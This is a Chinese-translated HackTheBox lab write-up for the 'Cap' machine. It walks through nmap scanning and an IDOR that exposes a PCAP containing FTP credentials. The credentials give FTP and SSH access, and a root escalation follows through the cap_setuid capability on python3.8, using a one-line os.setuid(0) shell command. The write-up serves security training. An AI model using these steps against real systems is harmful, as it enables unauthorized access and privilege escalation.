<html>
<head>
<title>HackTheBox Writeup: Cap</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HackTheBox详细报道:Cap</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-writeup-cap-43c7b6bcb32a?source=collection_archive---------3-----------------------#2021-10-16">https://infosecwriteups.com/hackthebox-writeup-cap-43c7b6bcb32a?source=collection_archive---------3-----------------------#2021-10-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/b96d87a061a9026f04df2fbd58b975db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*7q9wypEoch4C43dd72oVWw.png"/></div></div></figure><p id="8103" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这是一个由易到难的Linux盒子，非常简单，对于新手来说是一个很好的入门挑战。为了解决机器，攻击者需要执行基本的扫描和枚举，以便在机器上获得立足点并获得用户标志。向root用户提升权限也是一个相对简单的过程，并且需要对Linux系统进行基本的枚举，以查找易受攻击的二进制文件。</p><h1 id="c17e" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">列举</h1><p id="c057" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">我开始枚举目标机器，用<strong class="ka ir"> NMAP </strong>执行快速扫描，以识别任何打开的端口:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="d378" class="mi kx iq me b gy mj mk l ml mm">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.245</span><span id="65df" class="mi kx iq me b gy mn mk l ml mm">PORT   STATE SERVICE REASON<br/>21/tcp open  ftp     syn-ack ttl 63<br/>22/tcp open  ssh     syn-ack ttl 63<br/>80/tcp open  http    syn-ack ttl 63</span></pre><p id="c89e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">扫描发现三个端口打开(即端口21、22和80)。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用NSE脚本来查找我可以利用的任何常见漏洞:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="84d2" class="mi kx iq me b gy mj mk l ml mm">nmap -sV -sC -Pn -v -p 21,22,80 -oN nmap-report 10.10.10.245</span><span id="fa40" class="mi kx iq me b gy mn mk l ml mm">PORT   STATE SERVICE VERSION<br/>21/tcp open  ftp     vsftpd 3.0.3<br/>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br/>80/tcp open  http    gunicorn<br/>| fingerprint-strings: <br/>|   FourOhFourRequest: <br/>|     HTTP/1.0 404 NOT FOUND<br/>|     Server: gunicorn<br/>|     Date: Tue, 08 Jun 2021 18:46:17 GMT<br/>|     Connection: close<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 232<br/>|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br/>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br/>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br/>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br/>|   GetRequest: <br/>|     HTTP/1.0 200 OK<br/>|     Server: gunicorn<br/>|     Date: Tue, 08 Jun 2021 18:46:11 GMT<br/>|     Connection: close<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 19386<br/>|     &lt;!DOCTYPE html&gt;<br/>|     &lt;html class="no-js" lang="en"&gt;<br/>|     &lt;head&gt;<br/>|     &lt;meta charset="utf-8"&gt;<br/>|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;<br/>|     &lt;title&gt;Security Dashboard&lt;/title&gt;<br/>|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;<br/>|     &lt;link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/font-awesome.min.css"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/themify-icons.css"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/metisMenu.css"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/owl.carousel.min.css"&gt;<br/>|     &lt;link rel="stylesheet" href="/static/css/slicknav.min.css"&gt;<br/>|     &lt;!-- amchar<br/>|   HTTPOptions: <br/>|     HTTP/1.0 200 OK<br/>|     Server: gunicorn<br/>|     Date: Tue, 08 Jun 2021 18:46:11 GMT<br/>|     Connection: close<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Allow: OPTIONS, GET, HEAD<br/>|     Content-Length: 0<br/>|   RTSPRequest: <br/>|     HTTP/1.1 400 Bad Request<br/>|     Connection: close<br/>|     Content-Type: text/html<br/>|     Content-Length: 196<br/>|     &lt;html&gt;<br/>|     &lt;head&gt;<br/>|     &lt;title&gt;Bad Request&lt;/title&gt;<br/>|     &lt;/head&gt;<br/>|     &lt;body&gt;<br/>|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;<br/>|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;<br/>|     &lt;/body&gt;<br/>|_    &lt;/html&gt;<br/>| http-methods: <br/>|_  Supported Methods: OPTIONS GET HEAD<br/>|_http-server-header: gunicorn<br/>|_http-title: Security Dashboard</span></pre><p id="9701" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我可以看到端口80有很多输出。我认为我有足够的信息继续前进，并开始检查托管在端口80上的网站。</p><h1 id="b8f8" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">HTTP —端口80分析</h1><p id="c7ce" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">导航到<a class="ae mo" href="http://10.10.10.245/" rel="noopener ugc nofollow" target="_blank"><em class="mp">http://10 . 10 . 10 . 245/</em></a><em class="mp"/>，我看到一个安全控制面板:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/b5ccdab50d6015f0733564553a370ca2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V5r1322sQecy5veJUogIxg.png"/></div></div><figcaption class="mr ms gj gh gi mt mu bd b be z dk translated">80端口网站</figcaption></figure><p id="d7cf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">通过查看不同的菜单项，我可以看到诸如目标机器IP配置详细信息和机器当前网络状态等信息。该网站还提供下载PCAP文件的功能，该文件可以作为网络流量的安全快照。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mv"><img src="../Images/47313713ef26e50d01ab630f824a2380.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FnSxs7Yejg3d-JWQXc3KSQ.png"/></div></div><figcaption class="mr ms gj gh gi mt mu bd b be z dk translated">PCAP 9</figcaption></figure><p id="1b0a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我可以在网络浏览器的URL中看到，有一个名为<strong class="ka ir"> /data </strong>的子目录，当前显示的PCAP是9号。我决定尝试通过输入不同的值来找到更早的PCAP:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="34ff" class="mi kx iq me b gy mj mk l ml mm"><a class="ae mo" href="http://10.10.10.245/" rel="noopener ugc nofollow" target="_blank"><em class="mp">http://10.10.10.245/</em></a>data/0</span></pre><p id="18fb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我可以看到这个工作，我得到了一个新的PCAP文件，可供下载。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/630443b43bc62d60d537beb96a1e4307.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nPpar3MqwBDLF41Khql-pw.png"/></div></div><figcaption class="mr ms gj gh gi mt mu bd b be z dk translated">PCAP 0</figcaption></figure><p id="5201" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我下载了id 0的PCAP，并用Wireshark<strong class="ka ir">检查了它。通过查看数据包捕获，我能够找到FTP登录的凭证:</strong></p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/e1c86796c1e4c9d982d0cc889070dd4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:730/format:webp/1*zk54vYPWxYeWPlOK7-hu7Q.png"/></div><figcaption class="mr ms gj gh gi mt mu bd b be z dk translated">FTP凭据</figcaption></figure><h1 id="ff8c" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">FTP —端口21分析</h1><p id="3fe7" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">使用上面找到的凭证，我登录到FTP并检索用户标志:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="df66" class="mi kx iq me b gy mj mk l ml mm">$ ftp 10.10.10.245</span><span id="581f" class="mi kx iq me b gy mn mk l ml mm">ftp&gt; ls<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>drwxr-xr-x    3 1001     1001         4096 Jun 12 08:37 snap<br/>drwxrwxr-x    2 1001     1001         4096 Jun 12 08:55 temp<br/>-r--------    1 1001     1001           33 Jun 12 08:32 user.txt<br/>226 Directory send OK.<br/>ftp&gt; get user.txt<br/>local: user.txt remote: user.txt<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for user.txt (33 bytes).<br/>226 Transfer complete.<br/>33 bytes received in 0.00 secs (96.4867 kB/s)</span><span id="c8a8" class="mi kx iq me b gy mn mk l ml mm">$ cat user.txt <br/>28e72d34119f0e........</span></pre><p id="2897" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为我有了用户<strong class="ka ir"> nathan </strong>的凭证，所以我决定尝试通过SSH端口22登录，以获得一个合适的shell。</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="1ca8" class="mi kx iq me b gy mj mk l ml mm">$ ssh nathan@10.10.10.245<br/>nathan@10.10.10.245's password:</span><span id="fa69" class="mi kx iq me b gy mn mk l ml mm">nathan@cap:~$</span></pre><h1 id="e822" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">权限提升— Linux功能</h1><p id="334e" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">为了将权限提升到root，我决定使用<strong class="ka ir"> linpeas.sh </strong>来枚举目标机器。浏览linpeas.sh提供的输出，我在Capabilities部分看到二进制文件<code class="fe my mz na me b">/usr/bin/python3.8</code>容易受到特权提升的攻击。</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="11d7" class="mi kx iq me b gy mj mk l ml mm">[+] Capabilities<br/><br/>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip<br/>/usr/bin/ping = cap_net_raw+ep<br/>/usr/bin/traceroute6.iputils = cap_net_raw+ep<br/>/usr/bin/mtr-packet = cap_net_raw+ep<br/>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span></pre><blockquote class="nb nc nd"><p id="1856" class="jy jz mp ka b kb kc kd ke kf kg kh ki ne kk kl km nf ko kp kq ng ks kt ku kv ij bi translated"><strong class="ka ir"> Linux功能</strong>为进程提供了可用根特权的子集。当一个进程/程序需要被分配更多的权限来完成它的任务时，比如打开一个网络套接字，这是很有用的。当您希望在执行特权操作之后(例如，在设置chroot并绑定到套接字之后)限制自己的进程时，功能非常有用。但是，通过向它们传递恶意命令或参数，然后以根用户身份运行，就可以攻击它们。</p></blockquote><p id="6787" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果您想了解更多关于Linux功能以及如何利用它们的信息，下面的链接很有用:</p><div class="nh ni gp gr nj nk"><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">Linux权限提升</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">你每天都使用黑客技巧吗？你觉得这本书很有趣吗？你愿意吗？这样我们就可以花更多的时间在这上面…</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="nt l"><div class="nu l nv nw nx nt ny jw nk"/></div></div></a></div><p id="a33d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我能够利用二进制文件<code class="fe my mz na me b">/usr/bin/python3.8</code>将我的权限提升到root，并获得root标志:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="04a1" class="mi kx iq me b gy mj mk l ml mm">$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'</span><span id="6b40" class="mi kx iq me b gy mn mk l ml mm">root@cap:~# cat /root/root.txt <br/>681839304b419da.........</span></pre><h1 id="708f" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">最后的想法</h1><p id="aa0c" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">总的来说，我发现这台机器非常简单，是让初学者轻松进入HackTheBox平台的一种方式。该机器向攻击者介绍核心原则(即枚举、web分析、权限提升等)。)的解决方案，并帮助开发解决挑战的关键技能。谢谢你一直读到最后，祝你黑客快乐😄！</p></div></div>    
</body>
</html>